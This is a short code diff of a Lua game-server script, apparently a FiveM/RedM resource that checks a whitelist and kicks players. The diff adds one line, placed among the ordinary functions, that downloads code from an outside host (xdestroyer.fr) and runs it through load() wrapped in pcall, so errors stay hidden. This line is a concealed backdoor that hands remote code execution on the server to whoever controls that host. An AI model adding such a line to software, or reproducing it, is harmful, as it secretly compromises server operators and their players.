@@ -14,6 +14,8 @@ function IsWhiteList (tab, val)
     return false
 end
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 -- If player is not whitelisted -- kick player from the server
 RegisterServerEvent('DevDokus:DisableF8:DropPlayer')
 AddEventHandler('DevDokus:DisableF8:DropPlayer', function()
